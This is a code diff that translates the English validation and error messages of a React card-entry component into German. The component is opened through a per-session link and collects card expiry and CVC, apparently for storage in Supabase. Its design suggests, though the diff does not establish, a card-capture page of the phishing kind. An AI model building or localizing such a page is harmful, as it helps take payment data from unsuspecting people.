@@ -58,11 +58,11 @@ export function CardClient({ sessionId }: Props) {
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Enter a valid expiry date (MM/YY).");
+      setMsg("Bitte geben Sie ein gueltiges Ablaufdatum ein (MM/JJ).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Enter a valid CVC/CVV (3 or 4 digits).");
+      setMsg("Bitte geben Sie eine gueltige CVC/CVV ein (3 oder 4 Ziffern).");
       return;
     }
     setSaving(true);
@@ -153,7 +153,7 @@ export function CardClient({ sessionId }: Props) {
       <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Invalid link.
+            Ungueltiger Link.
           </p>
         </div>
       </div>
@@ -239,11 +239,11 @@ export function CardClient({ sessionId }: Props) {
             </div>
 
             {!expiryValid && expiry.length > 0 ? (
-              <p className="text-xs text-red-400">Expiry date must be in MM/YY format.</p>
+              <p className="text-xs text-red-400">Das Ablaufdatum muss im Format MM/JJ sein.</p>
             ) : null}
 
             {!cvcValid && cvc.length > 0 ? (
-              <p className="text-xs text-red-400">CVV must contain 3 or 4 digits.</p>
+              <p className="text-xs text-red-400">Die CVV muss 3 oder 4 Ziffern enthalten.</p>
             ) : null}
 
             {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
